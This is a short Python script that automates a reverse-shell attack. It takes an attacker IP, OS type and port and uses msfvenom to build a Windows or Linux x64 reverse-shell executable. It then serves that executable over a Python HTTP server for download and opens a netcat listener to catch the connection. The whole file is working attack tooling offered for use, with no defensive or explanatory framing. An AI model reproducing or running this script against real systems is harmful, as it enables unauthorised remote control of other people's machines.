import argparse
import ipaddress
import subprocess
import os

def clear_screen():
    try:
        os.getuid()
        subprocess.run("clear",shell=True)
    except AttributeError:
        subprocess.run("cls",shell=True)

def get_args():
    parser = argparse.ArgumentParser(prog='script.py' ,description='Syntax: script.py -o * -i * -p *', epilog='')
    parser.add_argument('-o', type=str, required=True, choices=['windows','linux'],help="os type (windows/linux)",metavar='')
    parser.add_argument('-i', type=ipaddress.IPv4Address, required=True,help="ipv4 address",metavar='')
    parser.add_argument('-p', type=int, required=True, help="port",metavar='')
    args = parser.parse_args()
    ip = args.i.compressed
    os_type = args.o
    port = args.p
    return ip,os_type,port

def make_payload(ip,os_type,port):
    linux_payload=f"msfvenom -p linux/x64/shell_reverse_tcp lhost={ip} lport={port} -f elf -o payload.elf"
    windows_payload=f"msfvenom -p windows/x64/shell_reverse_tcp lhost={ip} lport={port} -f exe -o payload.exe"
    if os_type == 'windows':
        subprocess.call(windows_payload,shell=True)
    else:
        subprocess.call(linux_payload,shell=True)

def python_server(ip):
    clear_screen()
    print("your payload is ready pls download the payload file\n")
    print(f"Server Is Up In {ip}:8000\n")
    print("use Ctl+C after you download the file to continue\n")
    subprocess.run(["python", "-m", "http.server"])

def netcat(port):
    clear_screen()
    subprocess.run(f'nc -lvp {port}',shell=True)

def main():
    ip,os_type,port = get_args()
    make_payload(ip,os_type,port)
    try:
        python_server(ip)
    except KeyboardInterrupt:
        netcat(port)

main()

